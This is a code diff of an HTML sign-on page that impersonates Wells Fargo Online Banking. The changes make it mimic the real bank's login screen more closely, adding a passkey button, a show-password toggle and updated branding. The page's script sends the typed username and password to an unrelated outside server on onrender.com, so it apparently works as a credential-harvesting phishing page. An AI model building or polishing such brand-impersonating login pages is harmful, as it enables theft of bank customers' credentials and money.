@@ -3,239 +3,184 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Wells Fargo Online Banking</title>
-  <link rel="icon" href="logo.png" type="image/png" />
+  <title>Wells Fargo Sign On</title>
   <style>
-    .save-username {
-  display: flex;
-  align-items: center;
-  margin-bottom: 20px;
-}
-
-.save-username input[type="checkbox"] {
-  margin-right: 8px;
-  transform: scale(1.2);
-}
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f8f9fa;
       margin: 0;
-      padding: 0;
+      font-family: Arial, sans-serif;
+      background: #fff;
+      color: #000;
     }
     header {
-      background-color: #b31b1b; /* Red header */
-      color: white;
-      padding: 15px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      flex-wrap: wrap;
-    }
-    header .logo {
-      display: flex;
-      align-items: center;
-    }
-    header .logo img {
-      height: 35px;
-      margin-right: 10px;
-    }
-    header .links a {
-      color: white;
-      margin-left: 15px;
-      text-decoration: none;
+      background-color: #b31b1b;
+      color: #fff;
+      padding: 12px;
+      text-align: center;
       font-weight: bold;
     }
-    header .links a:hover {
-      text-decoration: underline;
-    }
     main {
-      max-width: 500px;
-      margin: 30px auto;
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      max-width: 400px;
+      margin: 0 auto;
       padding: 20px;
     }
     h2 {
+      font-size: 20px;
       text-align: center;
-      color: #b31b1b;
-      margin-top: 0;
+      margin: 20px 0;
     }
-    form input {
-      width: 100%;
-      padding: 12px;
+    .input-group {
       margin-bottom: 15px;
-      border: 1px solid #ccc;
-      border-radius: 4px;
-      font-size: 16px;
+      position: relative;
     }
-    form button {
+    .input-group input {
       width: 100%;
-      padding: 12px;
-      background-color: #b31b1b;
-      border: none;
-      color: white;
-      font-weight: bold;
-      border-radius: 4px;
+      padding: 14px;
       font-size: 16px;
+      border: 1px solid #aaa;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+    .input-group .show-link {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 14px;
+      color: #3f51b5;
       cursor: pointer;
     }
-    form button:hover {
-      background-color: #911010;
-    }
-    .form-links {
-      text-align: center;
-      margin-top: 10px;
-      font-size: 14px;
-    }
-    .form-links a {
-      color: #003366;
-      text-decoration: none;
-    }
-    .form-links a:hover {
-      text-decoration: underline;
-    }
-    .security-center, footer {
-      max-width: 800px;
-      margin: 30px auto;
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      padding: 20px;
-      font-size: 14px;
-    }
-    .security-center h3, footer h3 {
-      color: #003366;
-      margin-top: 0;
-    }
-    .security-center ul {
-      list-style: none;
-      padding: 0;
-    }
-    .security-center ul li {
-      margin-bottom: 10px;
-    }
-    .security-center ul li::before {
-      content: "• ";
-      color: red;
-    }
-    footer .footer-links {
+    .checkbox {
       display: flex;
-      flex-wrap: wrap;
-      gap: 30px;
-      margin-top: 20px;
+      align-items: center;
+      margin: 10px 0 20px;
     }
-    footer .footer-links div {
-      min-width: 150px;
+    .checkbox input {
+      transform: scale(1.2);
+      margin-right: 8px;
     }
-    footer a {
-      color: #003366;
+    .checkbox label {
+      font-size: 14px;
+    }
+    .sign-on-btn {
+      width: 100%;
+      padding: 14px;
+      background: #ccc;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #555;
+      cursor: not-allowed;
+    }
+    .passkey-btn {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #333;
+      border-radius: 6px;
+      background: #fff;
+      font-size: 16px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    .forgot-link {
+      text-align: center;
+      margin: 15px 0;
+      font-size: 14px;
+    }
+    .forgot-link a {
+      color: #3f51b5;
       text-decoration: none;
     }
-    footer a:hover {
-      text-decoration: underline;
-    }
-    footer p {
-      text-align: center;
-      margin-top: 20px;
+    footer {
+      max-width: 500px;
+      margin: 30px auto;
+      padding: 10px;
       font-size: 12px;
+      text-align: center;
       color: #555;
     }
   </style>
 </head>
 <body>
   <header>
-    <div class="logo">
-      <img src="logo.png" alt="Wells Fargo Logo" />
-      <span><strong>WELLS FARGO</strong></span>
-    </div>
-    <div class="links">
-      <a href="#">Locations</a>
-      <a href="#">English</a>
-    </div>
+    WELLS FARGO
   </header>
 
   <main>
-    <h2>Sign On</h2>
+    <h2>Good morning</h2>
     <form id="login-form">
-      <input type="email" id="email" placeholder="Username or email" required />
-      <input type="password" id="password" placeholder="Password" required />
-      <div style="display: inline-flex; align-items: center; margin-bottom: 10px; vertical-align: middle;">
-  <input type="checkbox" id="save-username" style="margin: 0; padding: 0; width: 16px; height: 16px; vertical-align: middle;" />
-  <label for="save-username" style="margin: 0 0 0 4px; font-size: 14px; line-height: 1; padding: 0; vertical-align: middle;">Save username</label>
-</div>
-      <button type="submit">Sign In</button>
-      <div class="form-links">
-        <a href="#">Forgot password?</a> |
-        <a href="signup.html">Enroll now</a>
+      <div class="input-group">
+        <input type="text" id="username" placeholder="Username" required />
+      </div>
+      <div class="input-group">
+        <input type="password" id="password" placeholder="Password" required />
+        <span class="show-link" id="togglePassword">Show</span>
+      </div>
+      <div class="checkbox">
+        <input type="checkbox" id="save-username" />
+        <label for="save-username">Save username</label>
+      </div>
+      <button type="button" id="signOnBtn" class="sign-on-btn" disabled>Sign on</button>
+      <button type="button" class="passkey-btn">Use a passkey</button>
+      <div class="forgot-link">
+        <a href="#">Forgot username or password?</a>
       </div>
     </form>
   </main>
 
-  <section class="security-center">
-    <h3>Security Center</h3>
-    <ul>
-      <li>Never share your password, account, or personal information</li>
-      <li>We will never ask for your account information via email</li>
-      <li>Report suspicious activity immediately</li>
-      <li>Always access your account through wellsfargo.com</li>
-    </ul>
-    <a href="#">Learn more about online security</a>
-  </section>
-
   <footer>
-    <div class="footer-links">
-      <div>
-        <h3>Products & Services</h3>
-        <a href="#">Checking Accounts</a><br>
-        <a href="#">Credit Cards</a><br>
-        <a href="#">Home Loans</a><br>
-        <a href="#">Personal Loans</a><br>
-        <a href="#">Retirement</a>
-      </div>
-      <div>
-        <h3>Online Security</h3>
-        <a href="#">Security Center</a><br>
-        <a href="#">Fraud Information</a><br>
-        <a href="#">Report Fraud</a><br>
-        <a href="#">Privacy & Cookies</a>
-      </div>
-      <div>
-        <h3>Customer Service</h3>
-        <a href="#">Contact Us</a><br>
-        <a href="#">FAQs</a><br>
-        <a href="#">Find ATMs/Branches</a><br>
-        <a href="#">Accessibility</a>
-      </div>
-    </div>
-    <p>
-      © 2024 Wells Fargo Bank, N.A. All rights reserved. Member FDIC. Equal Housing Lender<br>
-      <a href="#">Privacy</a> | <a href="#">Security</a> | <a href="#">Terms & Conditions</a> | <a href="#">Ad Choices</a>
-    </p>
+    © 2025 Wells Fargo Bank, N.A. All rights reserved.
   </footer>
 
   <script>
-    const BASE_URL = 'https://backend15-nnmy.onrender.com';
+    // Show/hide password
+    const togglePassword = document.getElementById("togglePassword");
+    const passwordInput = document.getElementById("password");
+    togglePassword.addEventListener("click", () => {
+      if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        togglePassword.textContent = "Hide";
+      } else {
+        passwordInput.type = "password";
+        togglePassword.textContent = "Show";
+      }
+    });
 
-    document.getElementById('login-form').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
+    // Enable sign on button when fields filled
+    const signOnBtn = document.getElementById("signOnBtn");
+    const usernameInput = document.getElementById("username");
+
+    function checkFields() {
+      if (usernameInput.value.trim() && passwordInput.value.trim()) {
+        signOnBtn.disabled = false;
+        signOnBtn.style.background = "#b31b1b";
+        signOnBtn.style.color = "white";
+        signOnBtn.style.cursor = "pointer";
+      } else {
+        signOnBtn.disabled = true;
+        signOnBtn.style.background = "#ccc";
+        signOnBtn.style.color = "#555";
+        signOnBtn.style.cursor = "not-allowed";
+      }
+    }
+
+    usernameInput.addEventListener("input", checkFields);
+    passwordInput.addEventListener("input", checkFields);
+
+    // Handle sign on
+    signOnBtn.addEventListener("click", async () => {
+      const email = usernameInput.value;
+      const password = passwordInput.value;
 
       try {
-        const res = await fetch(`${BASE_URL}/api/auth/login`, {
+        const res = await fetch('https://backend15-nnmy.onrender.com/api/auth/login', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email, password })
         });
-
         const data = await res.json();
-
         if (res.ok && data.token) {
           localStorage.setItem('userToken', data.token);
-          localStorage.setItem('userName', data.name);
-          localStorage.setItem('userEmail', data.email);
-          localStorage.setItem('userBalance', data.balance);
           window.location.href = 'dashboard.html';
         } else {
           alert(data.error || 'Login failed.');
